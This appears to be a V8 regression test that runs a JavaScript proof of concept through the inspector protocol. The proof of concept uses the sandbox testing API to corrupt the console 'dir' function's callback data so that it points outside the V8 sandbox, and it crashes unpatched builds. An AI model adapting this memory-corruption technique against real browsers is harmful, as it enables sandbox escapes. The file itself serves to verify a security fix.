// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --enable-inspector --sandbox-testing

globalThis.receive = function(message) {
  print(message);
};

const expression = String.raw`
const print = (...args) => console.log(...args);
const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function r32(addr) {
  return mem.getUint32(addr >>> 0, true);
}

function w32(addr, value) {
  mem.setUint32(addr >>> 0, value >>> 0, true);
}

function w64(addr, value) {
  mem.setBigUint64(addr >>> 0, BigInt(value), true);
}

function raw(obj) {
  return Sandbox.getAddressOf(obj) >>> 0;
}

function hex32(value) {
  return "0x" + (value >>> 0).toString(16);
}

function hex64(value) {
  return "0x" + BigInt(value).toString(16);
}

function full(offset) {
  return BigInt(Sandbox.base) + BigInt(offset >>> 0);
}

function objectFromTagged(tagged) {
  return Sandbox.getObjectAt(((tagged >>> 0) - 1) >>> 0);
}

function offsetFromTagged(tagged) {
  return ((tagged >>> 0) - 1) >>> 0;
}

function typeOfTagged(tagged) {
  return Sandbox.getInstanceTypeOfObjectAt(offsetFromTagged(tagged));
}

function sizeOfTagged(tagged) {
  return Sandbox.getSizeOfObjectAt(offsetFromTagged(tagged));
}

function isTaggedHeapObject(tagged) {
  return (tagged & 1) === 1 &&
      tagged !== 0x11 &&
      Sandbox.isValidObjectAt(offsetFromTagged(tagged));
}

function chooseUnmappedTarget() {
  const sandboxBase = BigInt(Sandbox.base);
  const sandboxEnd = sandboxBase + BigInt(Sandbox.byteLength);
  const candidates = [
    0x414141410000n,
    0x515151510000n,
    0x626262620000n,
    0x6d6d6d6d0000n,
  ];

  for (const candidate of candidates) {
    if (candidate >= sandboxBase && candidate < sandboxEnd) continue;
    return candidate;
  }
  throw new Error("could not choose an out-of-sandbox target");
}

function findArrayElements(jsArray, predicate) {
  const base = raw(jsArray);
  for (let off = 0; off < 32; off += 4) {
    const tagged = r32(base + off);
    if (!isTaggedHeapObject(tagged)) continue;
    if (typeOfTagged(tagged) !== "FIXED_ARRAY_TYPE") continue;
    const objBase = offsetFromTagged(tagged);
    const length = r32(objBase + 4);
    const first = length > 0 ? r32(objBase + 8) : 0;
    if (!predicate || predicate({tagged, offset: objBase, off, length, first})) {
      return {tagged, offset: objBase, off, length, first};
    }
  }
  throw new Error("could not find JSArray elements");
}

const holder = {};
const arenaCarrier = new Array(512).fill(holder);
const arenaElements = findArrayElements(
    arenaCarrier, ({length}) => length >= 512);
const arena = (arenaElements.offset + 8) >>> 0;

const fakeConsole = arena;
const fakeIsolate = (arena + 0x100) >>> 0;
const fakeData = new ArrayBuffer(16);
const target = chooseUnmappedTarget();

// The goal is to crash if the fix is not applied. If the fix is applied, the data will be a JSArray instead of a JSArrayBuffer.
// We overwrite the callback_data of dirFunc.
const dirFunc = globalThis.dir;
const dirFuncAddr = raw(dirFunc);
const sharedOrSomething = offsetFromTagged(r32(dirFuncAddr + 24)); // JSFunction::shared_function_info
const functionData = offsetFromTagged(r32(sharedOrSomething + 8)); // SharedFunctionInfo::function_data

const size = sizeOfTagged(r32(sharedOrSomething + 8));
let foundData = false;
for (let off = 0; off < size; off += 4) {
  const tagged = r32(functionData + off);
  if (isTaggedHeapObject(tagged)) {
    const type = typeOfTagged(tagged);
    // Before the fix, it was an ArrayBuffer. After the fix, it's an Array.
    // If it's ArrayBuffer, we attempt to exploit.
    if (type === "JS_ARRAY_BUFFER_TYPE") {
      print("Found ArrayBuffer at offset " + off);

      const fakeConsolePtr = target;
      new DataView(fakeData).setBigUint64(0, fakeConsolePtr, true); // data->first

      // Replace the ArrayBuffer with our fake ArrayBuffer
      w32(functionData + off, raw(fakeData) + 1);

      foundData = true;
      break;
    }
  }
}

if (!foundData) {
  print("No ArrayBuffer found, fix applied.");
} else {
  try {
    globalThis.dir(1);
  } catch (e) {
    print("Caught error: " + e);
  }
}
`;

send(JSON.stringify({
  id: 1,
  method: 'Runtime.evaluate',
  params: {
    includeCommandLineAPI: true,
    expression,
  },
}));
